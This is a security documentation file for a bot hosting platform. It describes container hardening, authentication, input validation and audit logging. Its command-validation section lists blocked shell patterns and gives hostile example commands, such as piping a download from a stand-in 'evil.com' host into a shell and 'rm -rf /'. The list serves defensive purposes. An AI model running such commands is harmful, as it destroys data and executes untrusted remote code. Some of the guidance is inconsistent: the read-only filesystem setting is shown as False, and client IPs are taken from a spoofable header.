# Security Documentation

This document outlines the security measures implemented in the Sapine Bot Hosting Platform.

## Table of Contents

1. [Overview](#overview)
2. [Container Security](#container-security)
3. [Authentication & Authorization](#authentication--authorization)
4. [Input Validation](#input-validation)
5. [File Upload Security](#file-upload-security)
6. [API Security](#api-security)
7. [Database Security](#database-security)
8. [Audit Logging](#audit-logging)
9. [Best Practices](#best-practices)
10. [Security Checklist](#security-checklist)

## Overview

The platform is designed to host untrusted user code in isolated Docker containers with strict security constraints. Security is implemented at multiple layers to prevent container escapes, code execution vulnerabilities, and unauthorized access.

## Container Security

### No Privileged Containers
```python
privileged = False  # Never set to True
```
- Containers run without privileged mode
- Prevents access to host devices and kernel features

### Capability Dropping
```python
cap_drop = ["ALL"]
```
- All Linux capabilities are dropped
- Prevents privilege escalation
- Limits container's ability to perform privileged operations

### Resource Limits
```python
mem_limit = ram_limit          # e.g., "256m"
cpu_quota = cpu_limit * 100000 # e.g., 0.5 -> 50000
cpu_period = 100000
```
- CPU and RAM limits enforced per container
- Prevents resource exhaustion attacks
- Limits based on user's subscription plan

### Network Isolation
```python
network_mode = "bridge"  # Not "host"
```
- Containers use bridge network mode
- No direct access to host network
- Isolated from other containers by default

### Security Options
```python
security_opt = ["no-new-privileges"]
```
- Prevents privilege escalation within container
- Child processes cannot gain more privileges

### Read-Only Root Filesystem (Where Possible)
```python
read_only = False  # Set to False for build steps
```
- Root filesystem is read-only after build
- Limits container's ability to modify system files
- `/tmp` remains writable for temporary files

### Container ID Protection
- Container IDs are **INTERNAL ONLY**
- Never exposed through API responses
- Stored only in database
- Users cannot directly access Docker API

## Authentication & Authorization

### JWT Token Authentication
```python
JWT_ALGORITHM = "HS256"
JWT_ACCESS_TOKEN_EXPIRE_MINUTES = 1440  # 24 hours
```
- Stateless authentication using JWT tokens
- Tokens expire after 24 hours
- Secret key must be strong (32+ random bytes)

### Password Hashing
```python
pwd_context = CryptContext(schemes=["argon2"], deprecated="auto")
```
- Passwords hashed with Argon2 (winner of Password Hashing Competition)
- Never stored in plaintext
- Salted automatically by Argon2
- No password length limitations (unlike bcrypt's 72-byte limit)
- Memory-hard algorithm resistant to GPU and ASIC attacks

### Role-Based Access Control (RBAC)
```python
class UserRole(str, enum.Enum):
    USER = "USER"      # Can manage own bots
    ADMIN = "ADMIN"    # Can moderate users
    OWNER = "OWNER"    # Full system access
```

### Permission Checks
```python
def verify_bot_ownership(bot_id: int, user_id: int, db: Session) -> Bot:
    # Ensures users can only access their own bots
```

### Account Status
```python
class UserStatus(str, enum.Enum):
    ACTIVE = "ACTIVE"
    SUSPENDED = "SUSPENDED"
```
- Suspended users cannot login or use platform
- Checked on every authenticated request

## Input Validation

### Command Validation
```python
def validate_start_command(command: str) -> bool:
    dangerous_patterns = [
        r'&&',      # Command chaining
        r'\|\|',    # Or operator
        r';',       # Command separator
        r'\|',      # Pipe
        r'>',       # Redirect output
        r'<',       # Redirect input
        r'`',       # Command substitution
        r'\$\(',    # Command substitution
        r'bash',    # Shell execution
        r'sh ',     # Shell execution
        # ... more patterns
    ]
```

**Blocked Patterns:**
- Shell operators: `&&`, `||`, `;`, `|`
- Redirects: `>`, `<`
- Command substitution: `` ` ``, `$()`
- Shell invocation: `bash`, `sh`, `/bin/`
- Dangerous commands: `rm`, `dd`, `mkfs`
- Piped downloads: `curl|`, `wget|`

**Example Valid Commands:**
- `python main.py`
- `node index.js`
- `python bot.py --config config.json`

**Example Invalid Commands:**
- `python main.py && rm -rf /`
- `bash -c "curl evil.com | sh"`
- `python bot.py; wget malware`

### Email Validation
```python
def validate_email(email: str) -> bool:
    pattern = r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$'
```

### Bot Name Validation
```python
def validate_bot_name(name: str) -> bool:
    pattern = r'^[a-zA-Z0-9_-]{3,50}$'
```
- 3-50 characters
- Alphanumeric, hyphens, underscores only

## File Upload Security

### Filename Sanitization
```python
def sanitize_filename(filename: str) -> str:
    # Remove path components
    filename = os.path.basename(filename)
    
    # Remove path traversal attempts
    filename = filename.replace("..", "").replace("/", "").replace("\\", "")
    
    # Keep only safe characters
    filename = re.sub(r'[^a-zA-Z0-9._-]', '_', filename)
```

**Protection Against:**
- Path traversal: `../../etc/passwd`
- Absolute paths: `/etc/passwd`
- Shell injection in filenames
- Unicode exploitation

### File Extension Validation
```python
RUNTIME_REGISTRY = {
    BotRuntime.PYTHON: {
        "allowed_extensions": [".py", ".txt", ".json", ".yaml", ".yml"],
    },
    BotRuntime.NODE: {
        "allowed_extensions": [".js", ".json", ".ts"],
    },
}
```

### ZIP Archive Safety
```python
for member in zip_ref.namelist():
    member_path = Path(member)
    if member_path.is_absolute() or ".." in member_path.parts:
        raise BadRequestException("Invalid file path in zip")
```

**Protection Against:**
- Zip bombs
- Path traversal in archive
- Absolute paths in archive
- Symlink attacks

### File Storage
```python
def get_bot_storage_path(bot_id: int) -> Path:
    base_path = Path("/var/lib/bots")
    bot_path = base_path / str(bot_id)
```
- Each bot has isolated directory
- Files never executed on host
- Host filesystem not accessible to containers

## API Security

### Rate Limiting
```python
@rate_limit(requests_per_minute=60)
async def endpoint(...):
```
- Default: 60 requests per minute per IP
- More restrictive limits on sensitive endpoints:
  - Registration: 5/minute
  - File upload: 5/minute
  - Bot actions: 10/minute

### CORS Configuration
```python
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],  # Configure for production
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)
```
- Configure `allow_origins` for production
- Specify exact origins, not `*`

### Request Size Limits
- FastAPI default limits apply
- Configure reverse proxy (nginx) for additional limits

### Security Headers
Recommended reverse proxy configuration:
```nginx
add_header X-Frame-Options "SAMEORIGIN" always;
add_header X-Content-Type-Options "nosniff" always;
add_header X-XSS-Protection "1; mode=block" always;
add_header Referrer-Policy "no-referrer-when-downgrade" always;
```

## Database Security

### Connection Security
```python
DATABASE_URL = "postgresql://user:pass@host:5432/db"
```
- Use strong database passwords
- Enable SSL/TLS for database connections in production
- Use connection pooling with limits

### SQL Injection Prevention
```python
# SQLAlchemy ORM prevents SQL injection
user = db.query(User).filter(User.email == email).first()
```
- All queries use parameterized statements
- ORM handles escaping automatically
- Never use raw SQL with user input

### Password Storage
```python
password_hash = Column(String(255), nullable=False)
```
- Passwords hashed with Argon2
- Original passwords never stored
- Hashes cannot be reversed

## Audit Logging

### Logged Actions
```python
class AuditLog(Base):
    user_id = Column(Integer, ForeignKey("users.id"))
    action = Column(String(100))      # e.g., "bot_start"
    target_id = Column(String(100))   # Resource ID
    ip_address = Column(String(50))   # Client IP
    details = Column(Text)            # Additional context
    created_at = Column(DateTime)
```

### Tracked Events
- `user_register` - New user registration
- `user_login` - User authentication
- `user_suspend` - Account suspension
- `user_activate` - Account activation
- `bot_create` - Bot creation
- `bot_upload` - File upload
- `bot_start` - Bot started
- `bot_stop` - Bot stopped
- `bot_restart` - Bot restarted
- `bot_delete` - Bot deletion

### IP Address Tracking
```python
def get_client_ip(request: Request) -> str:
    forwarded = request.headers.get("X-Forwarded-For")
    if forwarded:
        return forwarded.split(",")[0].strip()
    return request.client.host
```

## Best Practices

### For Deployment

1. **Environment Variables**
   ```bash
   # Generate strong JWT secret
   openssl rand -hex 32
   
   # Use strong database passwords
   openssl rand -base64 32
   ```

2. **HTTPS Only**
   - Always use HTTPS in production
   - Configure SSL certificates
   - Redirect HTTP to HTTPS

3. **Reverse Proxy**
   - Use nginx or similar
   - Configure rate limiting
   - Add security headers
   - Filter malicious requests

4. **Database**
   - Use SSL/TLS connections
   - Regular backups
   - Principle of least privilege
   - Separate user for application

5. **Docker Security**
   - Keep Docker updated
   - Use Docker socket securely
   - Monitor container resources
   - Set up log rotation

6. **Monitoring**
   - Monitor failed login attempts
   - Track resource usage
   - Alert on suspicious activities
   - Review audit logs regularly

### For Development

1. **Never commit secrets**
   ```gitignore
   .env
   *.key
   *.pem
   ```

2. **Use environment variables**
   ```python
   JWT_SECRET_KEY = os.getenv("JWT_SECRET_KEY")
   ```

3. **Update dependencies**
   ```bash
   pip install --upgrade -r requirements.txt
   ```

4. **Run security scanners**
   - `bandit` for Python security
   - `safety` for dependency vulnerabilities
   - `trivy` for container scanning

## Security Checklist

### Before Production

- [ ] Change default JWT secret to strong random value
- [ ] Configure strong database password
- [ ] Enable HTTPS/SSL
- [ ] Configure specific CORS origins (not `*`)
- [ ] Set up reverse proxy with security headers
- [ ] Configure firewall rules
- [ ] Enable database SSL/TLS
- [ ] Set up log rotation
- [ ] Configure monitoring and alerts
- [ ] Review and harden Docker daemon
- [ ] Set up regular backups
- [ ] Document incident response procedures
- [ ] Perform security audit
- [ ] Load test rate limiting

### Regular Maintenance

- [ ] Review audit logs weekly
- [ ] Update dependencies monthly
- [ ] Review user accounts for suspicious activity
- [ ] Monitor container resource usage
- [ ] Check for failed login attempts
- [ ] Review and update security policies
- [ ] Test backup restoration
- [ ] Update security documentation

## Reporting Security Issues

If you discover a security vulnerability, please:

1. **DO NOT** open a public GitHub issue
2. Email security concerns to: security@sapine.com (replace with actual email)
3. Include:
   - Description of the vulnerability
   - Steps to reproduce
   - Potential impact
   - Suggested fix (if any)

We will respond within 48 hours and work with you to address the issue.

## References

- [Docker Security Best Practices](https://docs.docker.com/engine/security/)
- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [JWT Best Practices](https://tools.ietf.org/html/rfc8725)
- [FastAPI Security](https://fastapi.tiangolo.com/tutorial/security/)
- [SQLAlchemy Security](https://docs.sqlalchemy.org/en/14/faq/security.html)
